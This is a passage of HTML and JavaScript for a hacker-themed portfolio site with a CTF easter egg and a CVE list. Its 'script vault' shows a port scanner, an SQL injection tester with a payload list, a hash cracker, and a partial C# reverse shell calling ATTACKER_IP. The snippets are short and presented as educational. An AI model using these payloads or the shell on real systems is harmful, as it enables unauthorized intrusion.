            <div class="terminal-input-line" style="animation: fadeInUp 0.3s 2.3s forwards; opacity: 0;">
                <span class="prompt-symbol">root@darknet:~$</span>
                <input type="text" id="terminal-input" autofocus autocomplete="off" spellcheck="false" placeholder="">
            </div>

            <div id="terminal-feedback" style="margin-top: 10px;"></div>

            <p class="hint-text" style="animation: fadeInUp 0.3s 3s forwards; opacity: 0;">
                > Hint: The command is "access_archive" <span class="cursor-blink"></span>
            </p>
        </div>
    </div>
</div>

<!-- ==================== MAIN CONTENT ==================== -->
<div id="main-content">

    <!-- Navigation -->
    <nav class="nav-bar" id="navbar">
        <div class="nav-inner">
            <a href="#" class="nav-logo">
                <span class="logo-bracket">[</span>
                D4RK_N3T
                <span class="logo-bracket">]</span>
            </a>

            <ul class="nav-links" id="navLinks">
                <li><a href="#home" class="active">./home</a></li>
                <li><a href="#vuln-map">./vuln_map</a></li>
                <li><a href="#scripts">./script_vault</a></li>
                <li><a href="#podcast">./th3_signal</a></li>
                <li><a href="#ctf">./ctf</a></li>
            </ul>

            <div class="nav-status">
                <div class="status-dot"></div>
                <span>SECURE_CONN</span>
            </div>

            <button class="mobile-menu-btn" id="mobileMenuBtn">[ MENU ]</button>
        </div>
    </nav>

    <!-- ===== HERO SECTION ===== -->
    <section class="hero-section" id="home">
        <div class="hero-grid">
            <div class="hero-text-side">
                <div class="hero-tag">
                    <span class="tag-dot"></span>
                    Available for Bug Bounty & Consulting
                </div>

                <h1 class="hero-name">
                    <span class="first-name">CYBER</span><br>
                    <span class="last-name glitch-text" data-text="S3CUR1TY">S3CUR1TY</span>
                </h1>

                <p class="hero-title">
                    Penetration Tester <span class="highlight">|</span> 
                    Python Developer <span class="highlight">|</span> 
                    Content Creator
                </p>

                <div class="hero-stats">
                    <div class="stat-item">
                        <span class="stat-number" data-count="150">0</span>
                        <span class="stat-label">Bugs Found</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-number" data-count="42">0</span>
                        <span class="stat-label">Scripts Built</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-number" data-count="25">0</span>
                        <span class="stat-label">Podcast Eps</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-number" data-count="12">0</span>
                        <span class="stat-label">CTFs Won</span>
                    </div>
                </div>

                <div class="hero-buttons">
                    <a href="#scripts" class="btn-primary">
                        &gt; View Scripts
                    </a>
                    <a href="#vuln-map" class="btn-secondary">
                        &gt; Explore Vulns
                    </a>
                </div>
            </div>

            <div class="hero-ascii-side">
                <pre class="hero-ascii-art">
    ╔══════════════════════════════╗
    ║                              ║
    ║     ▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓       ║
    ║     ▓     ▓  ▓     ▓       ║
    ║     ▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓       ║
    ║         ▓▓▓▓▓▓▓▓            ║
    ║       ▓▓▓▓▓▓▓▓▓▓▓▓         ║
    ║      ▓▓  ▓▓▓▓▓▓  ▓▓        ║
    ║     ▓▓   ▓▓▓▓▓▓   ▓▓       ║
    ║          ▓▓▓▓▓▓             ║
    ║         ▓▓    ▓▓            ║
    ║        ▓▓      ▓▓           ║
    ║                              ║
    ║   [ AUTHORIZED  ACCESS ]     ║
    ║   [ STATUS: HUNTING... ]     ║
    ╚══════════════════════════════╝
                </pre>
            </div>
        </div>
    </section>

    <div class="section-divider"></div>

    <!-- ===== VULNERABILITY MAP ===== -->
    <section class="section vuln-map-container" id="vuln-map">
        <div class="section-header">
            <div class="section-tag">
                <span class="leet">// 0x02</span> VULNERABILITY DATABASE
            </div>
            <h2 class="section-title">
                <span class="red">&gt;</span> Vuln3r4b1l1ty_M4p
            </h2>
        </div>

        <div class="world-map-wrapper">
            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px; direction: ltr;">
                <span style="color: var(--red-blood); font-size: 20px;">◉</span>
                <span style="color: var(--text-dim); font-size: 13px;">Click on any country to view vulnerability details</span>
            </div>

            <div class="map-grid" id="mapGrid">
                <!-- Countries will be populated by JS -->
            </div>
        </div>
    </section>

    <!-- Vulnerability Modal -->
    <div class="vuln-modal" id="vulnModal">
        <div class="vuln-modal-content">
            <div class="vuln-modal-header">
                <h3 id="modalTitle">Vulnerability Details</h3>
                <button class="vuln-close-btn" onclick="closeVulnModal()">✕</button>
            </div>
            <div class="vuln-modal-body" id="modalBody">
                <!-- Populated by JS -->
            </div>
        </div>
    </div>

    <div class="section-divider"></div>

    <!-- ===== SCRIPT VAULT ===== -->
    <section class="section" id="scripts">
        <div class="section-header">
            <div class="section-tag">
                <span class="leet">// 0x03</span> CODE REPOSITORY
            </div>
            <h2 class="section-title">
                <span class="red">&gt;</span> Th3_Scr1pt_V4ult
            </h2>
        </div>

        <div class="scripts-grid" id="scriptsGrid">
            <!-- Script 1: Port Scanner -->
            <div>
                <div class="code-editor">
                    <div class="editor-header">
                        <div class="editor-tabs">
                            <span class="editor-tab active">
                                <span class="file-icon python-icon">🐍</span>
                                port_scanner.py
                            </span>
                        </div>
                        <div class="editor-actions">
                            <button class="copy-btn" onclick="copyCode(this, 'code1')">
                                📋 Copy
                            </button>
                        </div>
                    </div>
                    <div class="editor-body">
                        <pre class="code-content" id="code1"><span class="line-number"> 1</span> <span class="import-kw">import</span> <span class="module">socket</span>
<span class="line-number"> 2</span> <span class="import-kw">import</span> <span class="module">threading</span>
<span class="line-number"> 3</span> <span class="import-kw">from</span> <span class="module">queue</span> <span class="import-kw">import</span> <span class="class-name">Queue</span>
<span class="line-number"> 4</span>
<span class="line-number"> 5</span> <span class="keyword">class</span> <span class="class-name">PortScanner</span>:
<span class="line-number"> 6</span>     <span class="keyword">def</span> <span class="function">__init__</span>(<span class="variable">self</span>, <span class="param">target</span>, <span class="param">threads</span>=<span class="number">100</span>):
<span class="line-number"> 7</span>         <span class="variable">self</span>.target = target
<span class="line-number"> 8</span>         <span class="variable">self</span>.threads = threads
<span class="line-number"> 9</span>         <span class="variable">self</span>.queue = <span class="class-name">Queue</span>()
<span class="line-number">10</span>         <span class="variable">self</span>.open_ports = []
<span class="line-number">11</span>
<span class="line-number">12</span>     <span class="keyword">def</span> <span class="function">scan_port</span>(<span class="variable">self</span>, <span class="param">port</span>):
<span class="line-number">13</span>         <span class="keyword">try</span>:
<span class="line-number">14</span>             sock = <span class="module">socket</span>.<span class="function">socket</span>()
<span class="line-number">15</span>             sock.<span class="function">settimeout</span>(<span class="number">1</span>)
<span class="line-number">16</span>             result = sock.<span class="function">connect_ex</span>(
<span class="line-number">17</span>                 (<span class="variable">self</span>.target, port)
<span class="line-number">18</span>             )
<span class="line-number">19</span>             <span class="keyword">if</span> result == <span class="number">0</span>:
<span class="line-number">20</span>                 <span class="variable">self</span>.open_ports.<span class="function">append</span>(port)
<span class="line-number">21</span>                 <span class="builtin">print</span>(<span class="string">f"[+] Port {port} is OPEN"</span>)
<span class="line-number">22</span>             sock.<span class="function">close</span>()
<span class="line-number">23</span>         <span class="keyword">except</span>:
<span class="line-number">24</span>             <span class="keyword">pass</span>
<span class="line-number">25</span>
<span class="line-number">26</span>     <span class="keyword">def</span> <span class="function">run</span>(<span class="variable">self</span>):
<span class="line-number">27</span>         <span class="keyword">for</span> port <span class="keyword">in</span> <span class="builtin">range</span>(<span class="number">1</span>, <span class="number">65536</span>):
<span class="line-number">28</span>             <span class="variable">self</span>.queue.<span class="function">put</span>(port)
<span class="line-number">29</span>         <span class="comment"># Start scanning threads</span>
<span class="line-number">30</span>         <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="builtin">range</span>(<span class="variable">self</span>.threads):
<span class="line-number">31</span>             t = <span class="module">threading</span>.<span class="class-name">Thread</span>(
<span class="line-number">32</span>                 target=<span class="variable">self</span>._worker
<span class="line-number">33</span>             )
<span class="line-number">34</span>             t.<span class="function">start</span>()</pre>
                    </div>
                    <div class="editor-footer">
                        <span>Python 3.11 | UTF-8</span>
                        <span>Lines: 34 | Size: 1.2KB</span>
                    </div>
                </div>
                <div class="script-info">
                    <h4>> Multi-threaded Port Scanner</h4>
                    <p>Fast TCP port scanner with 100 concurrent threads. Scans all 65535 ports in under 60 seconds.</p>
                    <div class="script-tags">
                        <span class="script-tag">Python</span>
                        <span class="script-tag">Networking</span>
                        <span class="script-tag">Threading</span>
                        <span class="script-tag">Recon</span>
                    </div>
                </div>
            </div>

            <!-- Script 2: SQL Injection Detector -->
            <div>
                <div class="code-editor">
                    <div class="editor-header">
                        <div class="editor-tabs">
                            <span class="editor-tab active">
                                <span class="file-icon python-icon">🐍</span>
                                sqli_detector.py
                            </span>
                        </div>
                        <div class="editor-actions">
                            <button class="copy-btn" onclick="copyCode(this, 'code2')">
                                📋 Copy
                            </button>
                        </div>
                    </div>
                    <div class="editor-body">
                        <pre class="code-content" id="code2"><span class="line-number"> 1</span> <span class="import-kw">import</span> <span class="module">requests</span>
<span class="line-number"> 2</span> <span class="import-kw">from</span> <span class="module">urllib.parse</span> <span class="import-kw">import</span> <span class="function">urljoin</span>
<span class="line-number"> 3</span>
<span class="line-number"> 4</span> <span class="variable">PAYLOADS</span> = [
<span class="line-number"> 5</span>     <span class="string">"' OR '1'='1"</span>,
<span class="line-number"> 6</span>     <span class="string">"' OR '1'='1' --"</span>,
<span class="line-number"> 7</span>     <span class="string">"' UNION SELECT NULL--"</span>,
<span class="line-number"> 8</span>     <span class="string">"1' AND '1'='1"</span>,
<span class="line-number"> 9</span>     <span class="string">"admin'--"</span>,
<span class="line-number">10</span> ]
<span class="line-number">11</span>
<span class="line-number">12</span> <span class="variable">ERROR_SIGNS</span> = [
<span class="line-number">13</span>     <span class="string">"sql syntax"</span>,
<span class="line-number">14</span>     <span class="string">"mysql_fetch"</span>,
<span class="line-number">15</span>     <span class="string">"unclosed quotation"</span>,
<span class="line-number">16</span>     <span class="string">"ORA-01756"</span>,
<span class="line-number">17</span> ]
<span class="line-number">18</span>
<span class="line-number">19</span> <span class="keyword">def</span> <span class="function">test_sqli</span>(<span class="param">url</span>, <span class="param">param</span>):
<span class="line-number">20</span>     <span class="keyword">for</span> payload <span class="keyword">in</span> <span class="variable">PAYLOADS</span>:
<span class="line-number">21</span>         data = {param: payload}
<span class="line-number">22</span>         resp = <span class="module">requests</span>.<span class="function">get</span>(
<span class="line-number">23</span>             url, params=data
<span class="line-number">24</span>         )
<span class="line-number">25</span>         <span class="keyword">for</span> sign <span class="keyword">in</span> <span class="variable">ERROR_SIGNS</span>:
<span class="line-number">26</span>             <span class="keyword">if</span> sign <span class="keyword">in</span> resp.text.<span class="function">lower</span>():
<span class="line-number">27</span>                 <span class="builtin">print</span>(<span class="string">f"[!] SQLi Found!"</span>)
<span class="line-number">28</span>                 <span class="builtin">print</span>(<span class="string">f"    Payload: {payload}"</span>)
<span class="line-number">29</span>                 <span class="keyword">return</span> <span class="number">True</span>
<span class="line-number">30</span>     <span class="keyword">return</span> <span class="number">False</span></pre>
                    </div>
                    <div class="editor-footer">
                        <span>Python 3.11 | UTF-8</span>
                        <span>Lines: 30 | Size: 0.9KB</span>
                    </div>
                </div>
                <div class="script-info">
                    <h4>> SQL Injection Detection Tool</h4>
                    <p>Automated SQLi tester that sends common payloads and detects SQL error signatures in responses.</p>
                    <div class="script-tags">
                        <span class="script-tag">Python</span>
                        <span class="script-tag">SQLi</span>
                        <span class="script-tag">Web Security</span>
                        <span class="script-tag">Automation</span>
                    </div>
                </div>
            </div>

            <!-- Script 3: Hash Cracker -->
            <div>
                <div class="code-editor">
                    <div class="editor-header">
                        <div class="editor-tabs">
                            <span class="editor-tab active">
                                <span class="file-icon python-icon">🐍</span>
                                hash_cracker.py
                            </span>
                        </div>
                        <div class="editor-actions">
                            <button class="copy-btn" onclick="copyCode(this, 'code3')">
                                📋 Copy
                            </button>
                        </div>
                    </div>
                    <div class="editor-body">
                        <pre class="code-content" id="code3"><span class="line-number"> 1</span> <span class="import-kw">import</span> <span class="module">hashlib</span>
<span class="line-number"> 2</span> <span class="import-kw">import</span> <span class="module">sys</span>
<span class="line-number"> 3</span>
<span class="line-number"> 4</span> <span class="keyword">def</span> <span class="function">crack_hash</span>(<span class="param">target_hash</span>, <span class="param">wordlist</span>):
<span class="line-number"> 5</span>     <span class="string">"""Attempt to crack MD5/SHA256 hash"""</span>
<span class="line-number"> 6</span>     algos = [<span class="string">'md5'</span>, <span class="string">'sha256'</span>, <span class="string">'sha1'</span>]
<span class="line-number"> 7</span>     
<span class="line-number"> 8</span>     <span class="keyword">with</span> <span class="builtin">open</span>(wordlist, <span class="string">'r'</span>) <span class="keyword">as</span> f:
<span class="line-number"> 9</span>         <span class="keyword">for</span> line <span class="keyword">in</span> f:
<span class="line-number">10</span>             word = line.<span class="function">strip</span>()
<span class="line-number">11</span>             <span class="keyword">for</span> algo <span class="keyword">in</span> algos:
<span class="line-number">12</span>                 h = <span class="module">hashlib</span>.<span class="function">new</span>(algo)
<span class="line-number">13</span>                 h.<span class="function">update</span>(word.<span class="function">encode</span>())
<span class="line-number">14</span>                 <span class="keyword">if</span> h.<span class="function">hexdigest</span>() == target_hash:
<span class="line-number">15</span>                     <span class="builtin">print</span>(<span class="string">f"[+] CRACKED!"</span>)
<span class="line-number">16</span>                     <span class="builtin">print</span>(<span class="string">f"    {algo}: {word}"</span>)
<span class="line-number">17</span>                     <span class="keyword">return</span> word
<span class="line-number">18</span>     <span class="keyword">return</span> <span class="number">None</span></pre>
                    </div>
                    <div class="editor-footer">
                        <span>Python 3.11 | UTF-8</span>
                        <span>Lines: 18 | Size: 0.6KB</span>
                    </div>
                </div>
                <div class="script-info">
                    <h4>> Multi-Algorithm Hash Cracker</h4>
                    <p>Dictionary-based hash cracker supporting MD5, SHA-1, and SHA-256 with wordlist attack.</p>
                    <div class="script-tags">
                        <span class="script-tag">Python</span>
                        <span class="script-tag">Cryptography</span>
                        <span class="script-tag">Cracking</span>
                    </div>
                </div>
            </div>

            <!-- Script 4: C# Reverse Shell -->
            <div>
                <div class="code-editor">
                    <div class="editor-header">
                        <div class="editor-tabs">
                            <span class="editor-tab active">
                                <span class="file-icon csharp-icon">⬟</span>
                                reverse_shell.cs
                            </span>
                        </div>
                        <div class="editor-actions">
                            <button class="copy-btn" onclick="copyCode(this, 'code4')">
                                📋 Copy
                            </button>
                        </div>
                    </div>
                    <div class="editor-body">
                        <pre class="code-content" id="code4"><span class="line-number"> 1</span> <span class="comment">// Educational Purpose Only</span>
<span class="line-number"> 2</span> <span class="import-kw">using</span> <span class="module">System</span>;
<span class="line-number"> 3</span> <span class="import-kw">using</span> <span class="module">System.Net.Sockets</span>;
<span class="line-number"> 4</span> <span class="import-kw">using</span> <span class="module">System.Diagnostics</span>;
<span class="line-number"> 5</span> <span class="import-kw">using</span> <span class="module">System.IO</span>;
<span class="line-number"> 6</span>
<span class="line-number"> 7</span> <span class="keyword">class</span> <span class="class-name">ReverseShell</span>
<span class="line-number"> 8</span> {
<span class="line-number"> 9</span>     <span class="keyword">static void</span> <span class="function">Main</span>(<span class="keyword">string</span>[] args)
<span class="line-number">10</span>     {
<span class="line-number">11</span>         <span class="keyword">var</span> client = <span class="keyword">new</span> <span class="class-name">TcpClient</span>(
<span class="line-number">12</span>             <span class="string">"ATTACKER_IP"</span>, <span class="number">4444</span>
<span class="line-number">13</span>         );
<span class="line-number">14</span>         <span class="keyword">var</span> stream = client.<span class="function">GetStream</span>();
<span class="line-number">15</span>         <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="class-name">StreamReader</span>(stream);
<span class="line-number">16</span>         <span class="keyword">var</span> writer = <span class="keyword">new</span> <span class="class-name">StreamWriter</span>(stream);
<span class="line-number">17</span>         
<span class="line-number">18</span>         <span class="keyword">while</span> (<span class="number">true</span>)
<span class="line-number">19</span>         {
<span class="line-number">20</span>             writer.<span class="function">Write</span>(<span class="string">"shell> "</span>);
<span class="line-number">21</span>             writer.<span class="function">Flush</span>();
<span class="line-number">22</span>             <span class="keyword">var</span> cmd = reader.<span class="function">ReadLine</span>();
<span class="line-number">23</span>             <span class="comment">// Execute command...</span>
<span class="line-number">24</span>         }
<span class="line-number">25</span>     }
<span class="line-number">26</span> }</pre>
                    </div>
                    <div class="editor-footer">
                        <span>C# | .NET 7.0 | UTF-8</span>
                        <span>Lines: 26 | Size: 0.8KB</span>
                    </div>
                </div>
                <div class="script-info">
                    <h4>> C# Reverse Shell (Educational)</h4>
                    <p>TCP reverse shell written in C# for Windows targets. For educational and authorized testing only.</p>
                    <div class="script-tags">
                        <span class="script-tag">C#</span>
                        <span class="script-tag">.NET</span>
                        <span class="script-tag">Post-Exploitation</span>
                        <span class="script-tag">Red Team</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <div class="section-divider"></div>

    <!-- ===== PODCAST SECTION ===== -->
    <section class="section" id="podcast">
        <div class="section-header">
            <div class="section-tag">
                <span class="leet">// 0x04</span> TRANSMISSIONS
            </div>
            <h2 class="section-title">
                <span class="red">&gt;</span> Th3_S1gn4l
            </h2>
        </div>

        <div class="podcast-grid">
            <!-- Episode 1 -->
            <div class="podcast-card">
                <div class="radio-player">
                    <div class="radio-top">
                        <div class="radio-display">
                            <div class="radio-frequency">FM 133.7</div>
                            <div class="radio-label">SIGNAL_LOCKED</div>
                        </div>
                        <div class="radio-indicator active"></div>
                    </div>

                    <div class="radio-controls">
                        <button class="radio-btn" onclick="seekBack(0)">⏪</button>
                        <button class="radio-btn play-btn" id="playBtn0" onclick="togglePlay(0)">▶</button>
                        <button class="radio-btn" onclick="seekForward(0)">⏩</button>
                    </div>

                    <div class="waveform" id="waveform0">
                        <!-- Generated by JS -->
                    </div>

                    <div class="radio-progress">
                        <span class="progress-time" id="currentTime0">00:00</span>
                        <div class="progress-bar-container" onclick="seekTo(event, 0)">
                            <div class="progress-bar-fill" id="progressFill0"></div>
                        </div>
                        <span class="progress-time" id="totalTime0">45:22</span>
                    </div>
                </div>
                <div class="podcast-details">
                    <div class="podcast-episode">EP.01 // TRANSMISSION #001</div>
                    <h3 class="podcast-title">The Art of Social Engineering</h3>
                    <p class="podcast-desc">
                        How hackers manipulate human psychology to bypass the strongest security systems. Real case studies and defense strategies.
                    </p>
                    <div class="podcast-meta">
                        <span>📅 2024-01-15</span>
                        <span>⏱ 45:22</span>
                        <span>🎧 2.4K plays</span>
                    </div>
                </div>
            </div>

            <!-- Episode 2 -->
            <div class="podcast-card">
                <div class="radio-player">
                    <div class="radio-top">
                        <div class="radio-display">
                            <div class="radio-frequency">FM 404.0</div>
                            <div class="radio-label">SIGNAL_LOCKED</div>
                        </div>
                        <div class="radio-indicator active"></div>
                    </div>

                    <div class="radio-controls">
                        <button class="radio-btn" onclick="seekBack(1)">⏪</button>
                        <button class="radio-btn play-btn" id="playBtn1" onclick="togglePlay(1)">▶</button>
                        <button class="radio-btn" onclick="seekForward(1)">⏩</button>
                    </div>

                    <div class="waveform" id="waveform1"></div>

                    <div class="radio-progress">
                        <span class="progress-time" id="currentTime1">00:00</span>
                        <div class="progress-bar-container" onclick="seekTo(event, 1)">
                            <div class="progress-bar-fill" id="progressFill1"></div>
                        </div>
                        <span class="progress-time" id="totalTime1">38:15</span>
                    </div>
                </div>
                <div class="podcast-details">
                    <div class="podcast-episode">EP.02 // TRANSMISSION #002</div>
                    <h3 class="podcast-title">Zero-Day Exploits Explained</h3>
                    <p class="podcast-desc">
                        Understanding the lifecycle of a zero-day vulnerability from discovery to patch. The underground market and responsible disclosure.
                    </p>
                    <div class="podcast-meta">
                        <span>📅 2024-02-01</span>
                        <span>⏱ 38:15</span>
                        <span>🎧 3.1K plays</span>
                    </div>
                </div>
            </div>

            <!-- Episode 3 -->
            <div class="podcast-card">
                <div class="radio-player">
                    <div class="radio-top">
                        <div class="radio-display">
                            <div class="radio-frequency">FM 80.80</div>
                            <div class="radio-label">SIGNAL_LOCKED</div>
                        </div>
                        <div class="radio-indicator active"></div>
                    </div>

                    <div class="radio-controls">
                        <button class="radio-btn" onclick="seekBack(2)">⏪</button>
                        <button class="radio-btn play-btn" id="playBtn2" onclick="togglePlay(2)">▶</button>
                        <button class="radio-btn" onclick="seekForward(2)">⏩</button>
                    </div>

                    <div class="waveform" id="waveform2"></div>

                    <div class="radio-progress">
                        <span class="progress-time" id="currentTime2">00:00</span>
                        <div class="progress-bar-container" onclick="seekTo(event, 2)">
                            <div class="progress-bar-fill" id="progressFill2"></div>
                        </div>
                        <span class="progress-time" id="totalTime2">52:08</span>
                    </div>
                </div>
                <div class="podcast-details">
                    <div class="podcast-episode">EP.03 // TRANSMISSION #003</div>
                    <h3 class="podcast-title">Dark Web: Myths vs Reality</h3>
                    <p class="podcast-desc">
                        Separating fact from fiction about the dark web. Tor networks, hidden services, and the real threats you should worry about.
                    </p>
                    <div class="podcast-meta">
                        <span>📅 2024-02-20</span>
                        <span>⏱ 52:08</span>
                        <span>🎧 5.7K plays</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <div class="section-divider"></div>

    <!-- ===== CTF CHALLENGE ===== -->
    <section id="ctf">
        <div class="ctf-banner">
            <h3 class="glitch-text" data-text="🏴 CTF Challenge 🏴">🏴 CTF Challenge 🏴</h3>
            <p>
                There's a hidden room somewhere in this website. Only those with the right skills can find it.
                <br>The flag format is: <strong style="color: var(--green-neon);">FLAG{...}</strong>
            </p>
            <div class="ctf-hint">
                <!-- H1dd3n_p4th: /s3cr3t_r00m_7734 -->
                <!-- Or decode this: RkxBR3tZMHVfRjB1bmRfVGgzX1MzY3IzdF9SMDBtfQ== -->
                > Hint: Sometimes the answers are hidden in plain sight... or in the source code 👀
                <br>> Try inspecting what you can't see...
            </div>
        </div>
    </section>

    <!-- ===== FOOTER ===== -->
    <footer class="footer">
        <pre class="footer-ascii">
  ╔══════════════════════════════════════════╗
  ║  "The quieter you become,               ║
  ║   the more you are able to hear."        ║
  ║                        - Kali Linux      ║
  ╚══════════════════════════════════════════╝
        </pre>
        <p class="footer-text">
            <span class="green">[</span> Built with <span class="red">❤</span> and <span class="green">code</span> <span class="green">]</span>
            // © 2024 D4RK_N3T
        </p>
        <div class="footer-links">
            <a href="#">GitHub</a>
            <a href="#">Twitter</a>
            <a href="#">LinkedIn</a>
            <a href="#">HackerOne</a>
        </div>
    </footer>
</div>

<!-- ==================== HIDDEN PAGE ==================== -->
<div id="hidden-page">
    <div class="hidden-content">
        <p class="congrats glitch-text" data-text="🎉 ACCESS GRANTED">🎉 ACCESS GRANTED</p>
        
        <pre class="trophy-ascii">
     ___________
    '._==_==_=_.'
    .-\:      /-.
   | (|:.     |) |
    '-|:.     |-'
      \::.    /
       '::. .'
         ) (
       _.' '._
      '-------'
    [ TROPHY UNLOCKED ]
        </pre>

        <div class="secret-msg">
            <p><strong style="color: var(--green-neon);">FLAG{Y0u_F0und_Th3_S3cr3t_R00m}</strong></p>
            <br>
            <p>Congratulations! You found the hidden room! 🎯</p>
            <p>This proves you have the curiosity and skills of a true hacker.</p>
            <br>
            <p>Skills demonstrated:</p>
            <p style="color: var(--green-neon);">✓ Source code analysis</p>
            <p style="color: var(--green-neon);">✓ HTML comment discovery</p>
            <p style="color: var(--green-neon);">✓ Base64 decoding (if you used the encoded hint)</p>
            <p style="color: var(--green-neon);">✓ Curiosity & persistence</p>
            <br>
            <p style="color: var(--amber);">Want to collaborate? Reach out: contact@darknet.hack</p>
        </div>

        <button class="hidden-close-btn" onclick="closeHiddenPage()">[ CLOSE & RETURN ]</button>
    </div>
</div>


<script>
// ==========================================
// MATRIX RAIN EFFECT
// ==========================================
const canvas = document.getElementById('matrix-canvas');
const ctx = canvas.getContext('2d');

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}
resizeCanvas();
window.addEventListener('resize', resizeCanvas);

const matrixChars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
const fontSize = 14;
let columns = Math.floor(canvas.width / fontSize);
let drops = Array(columns).fill(1);

function drawMatrix() {
    ctx.fillStyle = 'rgba(13, 13, 13, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    ctx.fillStyle = '#00ff41';
    ctx.font = fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {
        const char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
        ctx.fillText(char, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}

setInterval(drawMatrix, 50);

window.addEventListener('resize', () => {
    columns = Math.floor(canvas.width / fontSize);
    drops = Array(columns).fill(1);
});

// ==========================================
// TERMINAL ENTRANCE
// ==========================================
const terminalInput = document.getElementById('terminal-input');
const terminalFeedback = document.getElementById('terminal-feedback');
const terminalEntrance = document.getElementById('terminal-entrance');
const mainContent = document.getElementById('main-content');

const validCommands = ['access_archive', 'access archive', 'login', 'enter', 'hack'];
let attempts = 0;

terminalInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        const command = this.value.trim().toLowerCase();
        
        if (validCommands.includes(command)) {
            // Success
            terminalFeedback.innerHTML = `
                <div class="terminal-line" style="animation: fadeInUp 0.3s forwards;">
                    <span class="success">[✓] Access granted. Welcome back, operator.</span>
                </div>
                <div class="terminal-line" style="animation: fadeInUp 0.3s 0.3s forwards; opacity: 0;">
                    <span class="success">[✓] Loading secure interface...</span>
                </div>
            `;
            
            setTimeout(() => {
                terminalEntrance.classList.add('unlocked');
                setTimeout(() => {
                    terminalEntrance.style.display = 'none';
                    mainContent.classList.add('visible');
                    initMainContent();
                }, 800);
            }, 1500);
            
        } else if (command === 'help') {
            terminalFeedback.innerHTML = `
                <div class="terminal-line" style="animation: fadeInUp 0.3s forwards;">
                    <span class="comment">Available commands:</span>
                </div>
                <div class="terminal-line" style="animation: fadeInUp 0.3s 0.2s forwards; opacity: 0;">
                    <span class="command">  access_archive  - Enter the main interface</span>
                </div>
                <div class="terminal-line" style="animation: fadeInUp 0.3s 0.4s forwards; opacity: 0;">
                    <span class="command">  help            - Show this help message</span>
                </div>
                <div class="terminal-line" style="animation: fadeInUp 0.3s 0.6s forwards; opacity: 0;">
                    <span class="command">  clear           - Clear the terminal</span>
                </div>
            `;
        } else if (command === 'clear') {
            terminalFeedback.innerHTML = '';
        } else if (command === 'sudo' || command.startsWith('sudo ')) {
            terminalFeedback.innerHTML = `
                <div class="terminal-line" style="animation: fadeInUp 0.3s forwards;">
                    <span class="error">[✗] Nice try. This isn't that kind of terminal 😏</span>
                </div>
            `;
        } else if (command === '') {
            // Do nothing for empty input
        } else {
            attempts++;
            let msg = `<span class="error">[✗] Command not found: "${command}"</span>`;
            
            if (attempts >= 3) {
                msg += `<br><span class="warning">[!] Hint: Try typing "help" or read the hint below</span>`;
            }
            
            terminalFeedback.innerHTML = `
                <div class="terminal-line" style="animation: fadeInUp 0.3s forwards;">
                    ${msg}
                </div>
            `;
        }
        
        this.value = '';
    }
});

// Auto-focus terminal input
terminalInput.focus();
document.addEventListener('click', () => {
    if (terminalEntrance.style.display !== 'none') {
        terminalInput.focus();
    }
});

// ==========================================
// MAIN CONTENT INITIALIZATION
// ==========================================
function initMainContent() {
    initCounters();
    initVulnMap();
    initWaveforms();
    initNavScroll();
    initSmoothScroll();
    logSecretMessage();
}

// ==========================================
// ANIMATED COUNTERS
// ==========================================
function initCounters() {
    const counters = document.querySelectorAll('.stat-number[data-count]');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const el = entry.target;
                const target = parseInt(el.getAttribute('data-count'));
                animateCounter(el, target);
                observer.unobserve(el);
            }
        });
    });
    
    counters.forEach(counter => observer.observe(counter));
}

function animateCounter(el, target) {
    let current = 0;
    const increment = target / 60;
    const timer = setInterval(() => {
        current += increment;
        if (current >= target) {
            el.textContent = target + '+';
            clearInterval(timer);
        } else {
            el.textContent = Math.floor(current);
        }
    }, 30);
}

// ==========================================
// VULNERABILITY MAP DATA
// ==========================================
const vulnerabilities = [
    {
        country: 'United States',
        flag: '🇺🇸',
        vulnCount: 'CVE-2021-44228',
        year: '2021',
        name: 'Log4Shell',
        severity: 'Critical',
        cvss: '10.0',
        affected: 'Apache Log4j 2.x',
        description: 'Remote code execution vulnerability in Apache Log4j. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers. Affected millions of Java applications worldwide.',
        impact: 'Allows complete system compromise through crafted log messages. Exploited in the wild within hours of disclosure.'
    },
    {
        country: 'Russia',
        flag: '🇷🇺',
        vulnCount: 'CVE-2017-0144',
        year: '2017',
        name: 'EternalBlue',
        severity: 'Critical',
        cvss: '9.8',
        affected: 'Microsoft Windows SMBv1',
        description: 'Buffer overflow in Windows SMBv1 server. Originally developed by NSA and leaked by Shadow Brokers. Used in the WannaCry and NotPetya ransomware attacks.',
        impact: 'Enabled the WannaCry ransomware that infected 230,000+ computers across 150 countries in a single day.'
    },
    {
        country: 'China',
        flag: '🇨🇳',
        vulnCount: 'CVE-2021-26855',
        year: '2021',
        name: 'ProxyLogon',
        severity: 'Critical',
        cvss: '9.8',
        affected: 'Microsoft Exchange Server',
        description: 'Server-side request forgery (SSRF) vulnerability in Microsoft Exchange. Allowed attackers to bypass authentication and impersonate as the admin.',
        impact: 'Over 250,000 Exchange servers compromised globally. Attributed to HAFNIUM threat group.'
    },
    {
        country: 'Iran',
        flag: '🇮🇷',
        vulnCount: 'CVE-2010-2568',
        year: '2010',
        name: 'Stuxnet LNK',
        severity: 'Critical',
        cvss: '9.3',
        affected: 'Windows Shell / Siemens SCADA',
        description: 'LNK file vulnerability exploited by the Stuxnet worm to target Iranian nuclear centrifuges. First known cyber weapon targeting physical infrastructure.',
